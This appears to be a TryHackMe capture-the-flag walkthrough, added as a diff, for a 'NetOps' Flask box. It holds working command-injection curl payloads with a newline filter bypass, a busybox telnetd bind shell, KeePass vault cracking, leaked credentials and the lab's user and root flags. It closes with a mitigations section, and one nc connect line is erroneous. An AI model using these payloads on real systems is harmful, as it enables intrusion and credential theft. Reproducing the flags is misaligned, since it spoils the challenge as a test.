@@ -1,0 +1,382 @@
+# TryHackMe - NetOps Box Walkthrough
+
+Target: `10.49.155.255` (hostname: `tryhackme-2204`, Ubuntu 22.04.5 LTS)
+Attacker: Kali box, connected via VPN interface `tun0`
+Application: Flask web app "netops" listening on port `5050`
+
+## Kill-Chain Summary
+
+1. **SQL injection** in the login form (`/internal`) — unparameterized query.
+2. **Command injection** in `/internal/health` — newline bypass of the filter.
+3. **Initial shell** as `www-data` — bind shell via `busybox telnetd`.
+4. **User flag** — leaked backup-agent credential in `secret.config` → SSH as `sysadmin`.
+5. **Lateral** — KeePass vault (`infrastructure.kdbx`, KDBX 4.0 / AES-KDF) cracked with master password `spring`.
+6. **Root flag** — root password recovered from the vault, used via `su -` (SSH root login disabled).
+
+---
+
+## 1. Recon
+
+Initial service scan of the target:
+
+```
+Nmap scan report for 10.49.155.255
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5050/tcp open  http    (Flask app)
+```
+
+Navigating to `http://10.49.155.255:5050/` shows a "netops" style web application with:
+
+- `/internal` — login form (`username` / `password`)
+- `/internal/health` — a network health-check tool that pings a supplied target
+- `/internal/dashboard` — logged-in dashboard
+
+The health-check page takes a `target` parameter and reflects the command output back on the page — a classic command-injection shape.
+
+## 2. Web Vuln #1 — SQL Injection in the Login
+
+Source: `/opt/netops/app.py`
+
+The login handler builds the query by **string interpolation** instead of parameterized statements:
+
+```python
+query = (
+    "SELECT id, username, role FROM users "
+    "WHERE username = '%s' AND password = '%s'"
+) % (username, pw_hash)
+
+row = db.execute(query).fetchone()
+```
+
+A `BLOCK_RE` filter attempts to block common payloads:
+
+```python
+BLOCK_RE = re.compile(
+    r"(union\s+select|drop\s+table|insert\s+into|xp_cmdshell)",
+    re.IGNORECASE
+)
+```
+
+This stops naive `union select` / `drop table` payloads but is trivially bypassed (e.g. comments, whitespace tricks, or a simple boolean-based / stacked approach). The password is hashed client-side with MD5 before interpolation, so the interesting vector is the username field.
+
+This SQLi is the primary way to authenticate as an existing user, but it is *not* what we needed for the kill chain — the command injection below gave us a full shell.
+
+## 3. Web Vuln #2 — Command Injection in /internal/health
+
+Source: `/opt/netops/app.py`
+
+```python
+PING_BLOCK_RE = re.compile(r"[;|`$&]")
+
+...
+
+proc = subprocess.Popen(
+    "ping -c 2 -W 1 " + target,
+    shell=True,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    text=True
+)
+```
+
+The developer explicitly noted the weakness in a comment:
+
+```python
+# vulnerable to newline injection (\n / %0a), fix soon.
+```
+
+The filter `[;|`$&]` blocks semicolons, pipes, backticks, dollar signs and ampersands — but **NOT newlines**. Because `shell=True`, a newline terminates the `ping` command and lets us run an arbitrary second command. The output is captured and reflected in the response.
+
+### Validating the injection
+
+First, confirm the injection primitive and which tools exist on the target:
+
+```bash
+curl -b /tmp/sess.txt -X POST http://10.49.155.255:5050/internal/health \
+  --data-urlencode $'target=127.0.0.1\nwhich python3'
+# -> /usr/bin/python3
+
+curl -b /tmp/sess.txt -X POST http://10.49.155.255:5050/internal/health \
+  --data-urlencode $'target=127.0.0.1\nwhich busybox'
+# -> /usr/bin/busybox
+```
+
+Findings:
+
+| Tool      | Status on target                       |
+|-----------|----------------------------------------|
+| `socat`   | not installed                          |
+| `ncat`    | not installed                          |
+| `nc`      | present, OpenBSD build (no `-e`)       |
+| `python3` | `/usr/bin/python3`                     |
+| `busybox` | `/usr/bin/busybox`                     |
+| `telnet`  | `/usr/bin/telnet`                      |
+
+**Character restrictions observed:** `; | ` $ &` are blocked. Allowed: `' " ( ) { } * ? # , : / -` space and **newline**.
+
+Because semicolons are blocked, any Python payload must use **newlines** as statement separators instead of `;`.
+
+## 4. Initial Foothold — Shell as www-data
+
+Socat and ncat weren't present, so a reverse shell with them was impossible. Instead we spawned a **bind shell** using busybox's `telnetd` (no `-e` support needed, no outbound connection required):
+
+```bash
+curl -b /tmp/sess.txt -X POST http://10.49.155.255:5050/internal/health \
+  --data-urlencode $'target=127.0.0.1\nbusybox telnetd -l /bin/bash -p 4444'
+```
+
+Connect to the bind shell from the attacker box:
+
+```bash
+nc tun0 4444
+# or
+nc 10.49.155.255 4444
+```
+
+Result:
+
+```
+Ubuntu 22.04.5 LTS
+www-data@tryhackme-2204:/opt/netops$
+```
+
+We are now `www-data` inside `/opt/netops` — the web app directory.
+
+## 5. Enumeration as www-data
+
+The working directory `/opt/netops` contained:
+
+```
+app.py  netops.db  secret.config  templates
+```
+
+### secret.config — the user pivot
+
+```ini
+# service account used by the backup agent
+# TODO: migrate to secrets manager before Q2 audit
+[backup_agent]
+run_as   = sysadmin
+password = S3cur3Backup$Acc3ss!
+```
+
+A plaintext credential for the `sysadmin` account, described as the "backup agent" service account.
+
+### app.py — other findings
+
+- `app.secret_key` comes from the `FLASK_SECRET` environment variable.
+- `init_db()` seeds the `users` table with `netops` / MD5(`C0rp$N3tS3cur3!`) / role `operator`.
+- The login query is SQLi-vulnerable (see above).
+- `/internal/health` is the command-injection point (see above).
+
+## 6. User Flag — SSH as sysadmin
+
+Use the leaked credential over SSH (target port 22 is open):
+
+```bash
+ssh sysadmin@10.49.155.255
+# password: S3cur3Backup$Acc3ss!
+```
+
+Result:
+
+```bash
+sysadmin@tryhackme-2204:~$ ls
+backups  user.txt
+sysadmin@tryhackme-2204:~$ cat user.txt
+THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
+```
+
+**User flag:** `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`
+
+### Enumeration as sysadmin
+
+```bash
+sysadmin@tryhackme-2204:~$ ls -la ~/backups
+-rw-r--r--  1 sysadmin sysadmin  286  README.txt
+-rw-------  1 sysadmin sysadmin 2439  infrastructure.kdbx
+```
+
+`README.txt`:
+
+```
+Backup archive — infrastructure credentials
+
+Periodic exports from the credential store are placed here by the backup agent.
+Treat all files in this directory as CONFIDENTIAL.
+
+infrastructure.kdbx — KeePass credential database
+
+Contact the sysadmin team lead if you require access.
+```
+
+`infrastructure.kdbx` is a **KeePass credential database** — the intended path to root.
+
+Other checks returned nothing interesting:
+
+```bash
+sudo -l
+# Sorry, user sysadmin may not run sudo on tryhackme-2204.
+
+find / -perm -4000 -type f 2>/dev/null
+# only standard snap / system SUID binaries
+
+getcap -r / 2>/dev/null
+# only standard ping / mtr / gst-ptp capabilities
+
+cat /etc/crontab && ls /etc/cron.d
+# default Ubuntu jobs, nothing custom
+
+systemctl list-timers --all
+# default Ubuntu timers only
+```
+
+No sudo rights, no custom cron, no custom SUID/capabilities. The KeePass vault is the way forward.
+
+## 7. KeePass Vault — infrastructure.kdbx
+
+Transfer the vault to the attacker machine:
+
+```bash
+scp sysadmin@10.49.155.255:/home/sysadmin/backups/infrastructure.kdbx .
+file infrastructure.kdbx
+# infrastructure.kdbx: Keepass password database 2.x KDBX
+```
+
+### Header analysis (determines the cracking approach)
+
+Parsing the KDBX4 outer header:
+
+```
+sig:     03d9a29a 67fb4bb5
+version: 4.0
+field 2 (CipherID)         = 31c1f2e6bf714350be5805216afc5aff   (AES-256)
+field 3 (CompressionFlags) = 01000000                            (GZip)
+field 4 (MasterSeed)       = dfac336bd70871c277c36e2781cd9090...
+field 11 (KDF parameters)  contains UUID c9d9f39a-628a-4460-bf74-0d08c18a4fea
+```
+
+The KDF parameter UUID `c9d9f39a-628a-4460-bf74-0d08c18a4fea` identifies **AES-KDF** (not Argon2). This is important: AES-KDF is fast to crack on CPU, so a full `rockyou.txt` run is feasible in minutes rather than hours/days.
+
+### The converter problem
+
+The stock Kali `keepass2john` (john 1.9.0-Jumbo, git 20211102) cannot parse KDBX4:
+
+```
+! infrastructure.kdbx : File version '40000' is currently not supported!
+```
+
+Fix: build the latest john jumbo from source (KDBX4-capable, CPU-only — no GPU/OpenCL required):
+
+```bash
+sudo apt install -y build-essential libssl-dev libgmp-dev zlib1g-dev
+git clone --depth 1 https://github.com/openwall/john.git /opt/john
+cd /opt/john/src && ./configure && make -s clean && make -sj4
+/opt/john/run/keepass2john infrastructure.kdbx > kdbx.hash
+cat kdbx.hash
+# infrastructure:$keepass$*2*...   (AES variant — fast to crack)
+```
+
+### Cracking the master password
+
+```bash
+/opt/john/run/john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
+/opt/john/run/john --show kdbx.hash
+```
+
+The master password is recovered quickly:
+
+```
+infrastructure:$keepass$*2*...:spring
+```
+
+**Master password: `spring`**
+
+> Note: if the vault had used Argon2 (KDBX4 hash `$keepass$*3*...`), CPU cracking would be much slower and a targeted candidate list should be tried before a full rockyou run.
+
+### Reading the vault
+
+```bash
+keepassxc-cli ls infrastructure.kdbx
+# (unlock with password: spring)
+# Root User Password - Sensitive
+# General/
+# Windows/
+# Network/
+# Internet/
+# eMail/
+# Homebanking/
+# Recycle Bin/
+```
+
+Show the root entry (exact title with the space matters):
+
+```bash
+keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
+```
+
+Output:
+
+```
+Title: Root User Password - Sensitive
+UserName: root
+Password: S3cur3P4ss0nK33p4ss
+URL: https://keepass.info/
+Notes: root user password, remember to change later.
+Uuid: {ab5192bf-d112-1141-853c-3c99d69d5cae}
+```
+
+**Root credentials: `root:S3cur3P4ss0nK33p4ss`**
+
+## 8. Root Flag
+
+SSH as root is rejected even with the correct password — the box has `PermitRootLogin` effectively disabled:
+
+```
+root@10.49.155.255's password:
+Permission denied, please try again.
+```
+
+So use the recovered password with `su -` from the sysadmin session:
+
+```bash
+sysadmin@tryhackme-2204:~$ su -
+Password:                          # S3cur3P4ss0nK33p4ss
+root@tryhackme-2204:~# ls
+root.txt  snap
+root@tryhackme-2204:~# cat root.txt
+THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
+```
+
+**Root flag:** `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| user.txt | `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}` |
+| root.txt | `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}` |
+
+## Credentials / Secrets Recovered
+
+| Account | Credential | Found in |
+|---------|------------|----------|
+| `www-data` | shell via bind | `busybox telnetd` |
+| `sysadmin` | `S3cur3Backup$Acc3ss!` | `/opt/netops/secret.config` |
+| KeePass master | `spring` | crack of `infrastructure.kdbx` |
+| `root` | `S3cur3P4ss0nK33p4ss` | `infrastructure.kdbx` → "Root User Password - Sensitive" |
+
+---
+
+## Mitigations / Lessons Learned
+
+1. **SQL injection** — the login query must use **parameterized statements** (never string interpolation). The custom `BLOCK_RE` blacklist approach is ineffective and should be removed in favor of proper parameterization.
+2. **Command injection** — never build shell commands with user input and `shell=True`. Use a fixed argument list (`subprocess.run(["ping", "-c", "2", target])`) and validate the target is a literal IP/hostname (e.g. `ipaddress.ip_address()`).
+3. **Filter bypass** — blocklists are fragile. The `[;|`$&]` filter missed the **newline** character, which is a full command separator in `sh`.
+4. **Secrets management** — plaintext credentials (`S3cur3Backup$Acc3ss!`) were sitting in a config file with a literal "TODO: migrate to secrets manager" comment. Use a secrets manager / environment variables.
+5. **Credential reuse & vault hygiene** — the root password lived in a KeePass vault on a compromised user's home directory, exported by a "backup agent". The master password (`spring`) was weak and crackable. Use strong vault passwords and strong KDF (Argon2) instead of AES-KDF, plus a key file.
+6. **Least privilege** — the web app ran as `www-data` but the DB/backup creds allowed a trivial pivot. Segment services and restrict what the web account can read.
+7. **SSH hardening** — root login via password was already effectively disabled (only `su -` worked), which is good practice; keep it that way.
